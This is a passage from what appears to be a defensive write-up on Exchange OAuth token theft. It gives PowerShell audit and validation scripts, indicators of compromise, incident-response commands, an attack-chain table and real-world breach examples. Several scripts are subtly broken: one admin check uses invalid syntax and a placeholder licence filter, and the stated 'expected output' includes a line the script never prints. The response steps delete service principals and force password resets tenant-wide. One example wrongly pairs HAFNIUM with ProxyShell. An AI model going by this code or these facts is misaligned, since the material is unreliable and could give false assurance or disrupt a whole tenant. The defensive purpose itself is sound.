# Export all granted OAuth applications
Get-MgServicePrincipal -Filter "servicePrincipalType eq 'Application'" | 
    Export-Csv -Path "C:\Audit\All_OAuth_Apps.csv"

# Audit admin-consented apps
Get-MgApplication | Where-Object { $_.ReplyUrls.Count -gt 0 } | 
    Select-Object DisplayName, AppId, CreatedDateTime | 
    Export-Csv -Path "C:\Audit\Admin_Consented_Apps.csv"
```

---

**Mitigation 5: Implement MFA for Admin Consent**

Require MFA when admins grant permissions to OAuth applications.

**Manual Steps (Conditional Access):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create **New Policy**:
   - Name: `Require MFA for OAuth App Consent`
   - Users: **All users** (or Admins only)
   - Cloud apps: **Microsoft Graph API**
   - Conditions: **Risk level** = **High**
3. **Grant Access**:
   - Require **multi-factor authentication**
4. Enable: **On**

---

**Mitigation 6: Validation Command**

Verify defensive controls are in place.

```powershell
# Check if any apps have full_access_as_app role
$AppsWithFullAccess = Get-MgServicePrincipal | Where-Object {
    (Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $_.Id | 
        Where-Object { $_.AppRoleId -eq "dc890d15-9560-4a4c-9b7f-a736ec74ec40" }).Count -gt 0
}

if ($AppsWithFullAccess.Count -eq 0) {
    Write-Host "[+] No apps have full_access_as_app role (secure)" -ForegroundColor Green
} else {
    Write-Host "[-] Found $($AppsWithFullAccess.Count) apps with full_access_as_app role" -ForegroundColor Red
}

# Check if MFA is enabled for admin users
$AdminUsers = Get-MgUser -Filter "assignedLicenses/any(x:x/skuId eq 'skuId')" | Where-Object { IsAdmin -eq $true }
foreach ($User in $AdminUsers) {
    $MFAStatus = Get-MsolUser -UserPrincipalName $User.UserPrincipalName | Select-Object StrongAuthenticationMethods
    if ($MFAStatus.StrongAuthenticationMethods.Count -eq 0) {
        Write-Host "[-] Admin $($User.UserPrincipalName) does NOT have MFA enabled" -ForegroundColor Red
    }
}
```

**Expected Output (If Secure):**

```
[+] No apps have full_access_as_app role (secure)
[+] All admins have MFA enabled
```

---

## 13. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Applications:** OAuth apps created in last 30 days, apps with `full_access_as_app` role, apps from unknown publishers
- **Credentials:** Service principal credentials in config files, API keys in environment variables
- **Network:** Outbound HTTPS to outlook.office365.com/EWS from unusual source IPs or at unusual times; residential proxy IPs accessing Exchange
- **EWS Operations:** Bulk mailbox access, inbox rule creation, forwarding rule changes, delegate access modifications

### Forensic Artifacts

- **Cloud (Entra ID Audit Logs):** OAuth app registration events, permission assignment events, consent grant events
- **Cloud (Exchange Admin Audit Log):** EWS API calls, inbox rule creation, forwarding rule changes, mailbox access
- **Cloud (Office 365 Management Activity API):** OAuth app usage logs, mailbox audits, permission changes
- **Memory:** OAuth access tokens in applications or scripts

### Response Procedures

1. **Isolate:**
   ```powershell
   # Immediately revoke all OAuth apps with suspicious permissions
   Get-MgServicePrincipal -Filter "servicePrincipalType eq 'Application'" | 
       Where-Object { 
           (Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $_.Id | 
               Where-Object { $_.AppRoleId -eq "dc890d15-9560-4a4c-9b7f-a736ec74ec40" }).Count -gt 0
       } | Remove-MgServicePrincipal
   
   # Revoke all active sessions for all users
   Revoke-MgUserSignInSession -UserId (Get-MgUser -All).Id
   
   # Force password reset for all users
   Get-MgUser -All | Update-MgUser -PasswordProfile @{ForceChangePasswordNextSignIn = $true}
   ```

2. **Collect Evidence:**
   ```powershell
   # Export audit logs for compromise window
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) | 
       Export-Csv -Path "C:\Evidence\Full_Audit_Log.csv"
   
   # Export OAuth app consent history
   Get-MgServicePrincipal -Filter "servicePrincipalType eq 'Application'" | 
       Export-Csv -Path "C:\Evidence\OAuth_Apps.csv"
   
   # List all email forwarding rules (check for attacker-created rules)
   Get-InboxRule -Mailbox * | Export-Csv -Path "C:\Evidence\Inbox_Rules.csv"
   ```

3. **Remediate:**
   - Delete all suspicious OAuth applications
   - Remove all suspicious inbox rules and forwarding rules
   - Audit all mailbox delegates and remove suspicious entries
   - Revoke and re-issue API credentials stored in applications
   - Monitor EWS logs for 30 days for residual attacker activity
   - Conduct email forensics on mailboxes accessed during compromise window

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker phishes admin to grant OAuth permissions |
| **2** | **Credential Access** | **[CA-TOKEN-011] Exchange OAuth Token Theft** | **Attacker uses OAuth app to access mailboxes via EWS** |
| **3** | **Collection** | [T1114] Email Collection | Attacker exfiltrates sensitive emails from all users |
| **4** | **Persistence** | [T1114.003] Email Forwarding Rule | Attacker creates forwarding rule to maintain access |
| **5** | **Impact** | Internal phishing, data exfiltration | Attacker uses stolen emails for follow-on attacks |

---

## 15. Real-World Examples

### Example 1: Midnight Blizzard / APT29 (January 2024)

- **Target:** Microsoft Corporation
- **Timeline:** December 2023 - January 2024 (discovery)
- **Technique Status:** Compromised legacy test OAuth app; created additional OAuth apps with `full_access_as_app`; used residential proxies to access EWS
- **Impact:** Read confidential Microsoft corporate emails; estimated access to 60 GB of data
- **Detection:** Anomalous EWS API volume spikes; unusual OAuth app creation; access to mailboxes from unusual IPs
- **Reference:** [Microsoft Security Blog - Midnight Blizzard](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/)

### Example 2: ProxyShell / HAFNIUM (August 2021)

- **Target:** On-premises Exchange Server organizations
- **Timeline:** Summer 2021 - Widespread exploitation through 2022+
- **Technique Status:** Chained CVEs (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) to achieve RCE and EWS access
- **Impact:** Thousands of organizations compromised; ransomware deployment; data exfiltration
- **Detection:** Unusual Autodiscover.json requests; suspicious IIS logs; web shell creation
- **Reference:** [Rapid7: ProxyShell Deep Dive](https://www.rapid7.com/blog/post/2021/08/12/proxyshell-more-widespread-exploitation-of-microsoft-exchange-servers/)

### Example 3: APT28 / Fancy Bear (2023-2024)

- **Target:** Government agencies, think tanks, NATO allies
- **Timeline:** 2023 - Present
- **Technique Status:** Password spray to compromise accounts; created OAuth apps with broad permissions; used EWS to collect emails
- **Impact:** Exfiltration of classified government communications; diplomatic intelligence
- **Detection:** Bulk EWS API access; unusual OAuth app creation by government tenants; anomalous email access patterns
- **Reference:** [MITRE - APT28 Attack Profile](https://attack.mitre.org/groups/G0007/)

---

**Related Techniques in MCADDF:**
- [IA-PHISH-002] Consent Grant OAuth Attacks
- [CA-TOKEN-004] Graph API Token Theft
- [CA-TOKEN-005] OAuth Access Token Interception
- [CA-TOKEN-006] Service Principal Certificate Theft
- [PE-ACCTMGMT-001] App Registration Permissions Escalation
- [LM-AUTH-029] OAuth Application Permissions Abuse
- [T1114] Email Collection / Email Forwarding Rules

---